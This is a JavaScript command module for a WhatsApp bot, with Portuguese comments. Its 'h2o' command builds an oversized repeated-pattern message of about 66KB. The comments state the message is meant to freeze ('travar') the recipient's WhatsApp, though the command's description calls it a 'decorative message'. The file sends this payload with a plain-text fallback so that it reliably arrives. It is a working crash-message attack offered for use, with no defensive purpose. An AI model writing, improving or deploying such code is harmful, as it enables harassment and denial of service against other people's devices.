// 2. Geração do Loop de Travamento
// Repetimos o padrão 33 vezes (mesmo valor do seu código original).
// Isso gera um texto de aproximadamente 66KB, suficiente para causar o efeito de "trava".
const SPAM_COUNT = 33;
const SPAM_TEXT = Array(SPAM_COUNT).fill(PATTERN).join("");

// 3. Montagem do Texto Final (Fallback/Preview)
// Este texto é usado no campo 'text' do sendA2UI para garantir que o WhatsApp
// tenha um preview legível caso a superfície A2UI não carregue instantaneamente.
const FINAL_TEXT = SPAM_TEXT + "BY CREATOR CHOSSO BOT V4 travando elas PAE ";

const HEADER = "╭━━━〔 ☠️ 𝐔𝐋𝐐𝐔𝐈𝐎𝐑𝐑𝐀 𝐁𝐎𝐓 〕━━━╮";
const FOOTER = "╰━━━〔 ⛓️ 𝐗𝐈𝐂 // 𝐇𝟐𝐎 〕━━━╯";

export default {
  name: "h2o",
  description: "Envia uma mensagem decorativa com efeito de travamento.",
  commands: ["h2o", "pestenegra", "peste"],
  usage: `${PREFIX}h2o`,

  handle: async ({ socket, remoteJid, webMessage }) => {
      const data = {
      version: "v0.9",
      createSurface: {
        surfaceId: `xic-h2o-${Date.now()}`,
        catalogId:
          "https://a2ui.org/specification/v0_9/catalogs/basic/catalog.json",
        components: [
          {
            id: "root",
            component: "Column",
            children: ["titulo", "resposta"],
          },
          {
            id: "titulo",
            component: "Text",
            text: "☠️ ULQUIORRA BOT • H2O ARCHIVE",
            variant: "h2",
          },
          {
            id: "resposta",
            component: "Text",
            text: FINAL_TEXT,
            variant: "body",
          },
        ],
      },
    };

    try {
      await sendA2UI(socket, remoteJid, {
        data,
        text: FINAL_TEXT, // Importante: Não deixar vazio para garantir preview
        quoted: webMessage,
      });
    } catch (error) {
      console.error("[H2O] Erro no A2UI, usando fallback de texto simples:", error);
      // Fallback: Se o A2UI falhar (ex: payload muito grande ou erro de rede), envia texto puro
      await socket.sendMessage(remoteJid, {
        text: FINAL_TEXT,
        quoted: webMessage,
      });
    }
  },
};